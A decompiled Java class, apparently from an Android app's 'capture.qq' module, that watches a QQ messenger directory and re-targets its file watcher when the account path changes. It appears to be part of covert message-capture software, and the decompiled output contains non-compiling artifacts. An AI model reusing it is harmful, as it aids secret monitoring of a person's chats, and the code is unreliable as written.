package com.vvt.capture.qq.a;

import android.os.FileObserver;
import com.vvt.n.a.d.a;

class e
  extends FileObserver
{
  public e(b paramb, String paramString)
  {
    super(paramString, 8);
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    int i = 8;
    if (paramInt == i)
    {
      boolean bool1 = b.d();
      if (bool1) {}
      Object localObject1 = a.b();
      boolean bool2 = b.d();
      if ((!bool2) || (localObject1 != null))
      {
        Object localObject2 = b.e();
        bool2 = ((String)localObject1).equals(localObject2);
        if (!bool2)
        {
          bool2 = b.d();
          if (bool2) {}
          localObject2 = b.c(this.a);
          if (localObject2 != null)
          {
            b.c(this.a).stopWatching();
            localObject2 = this.a;
            localc = null;
            b.a((b)localObject2, null);
          }
          b.b((String)localObject1);
          localObject1 = a.a();
          localObject2 = this.a;
          QQFileObserver localc = new com/vvt/capture/qq/a/ QQFileObserver;
          b localb = this.a;
          localc.<init>(localb, (String)localObject1);
          b.a((b)localObject2, localc);
          localObject1 = b.c(this.a);
          ((QQFileObserver)localObject1).startWatching();
        }
      }
      bool1 = b.d();
      if (!bool1) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/qq/a/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */